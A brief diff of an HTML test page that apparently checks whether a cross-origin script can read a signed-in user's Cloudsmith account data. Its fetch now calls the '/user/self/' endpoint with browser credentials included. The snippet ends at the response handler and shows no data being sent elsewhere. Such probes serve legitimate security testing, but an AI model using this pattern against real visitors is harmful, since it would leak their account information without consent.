@@ -1,7 +1,7 @@
-<h1>Cloudsmith Credential Test</h1>
+<h1>Cloudsmith Account Leak Test</h1>
 
 <script>
-fetch("https://api.cloudsmith.io/v1/repos/", {
+fetch("https://api.cloudsmith.io/v1/user/self/", {
     credentials: "include"
 })
 .then(async r => {
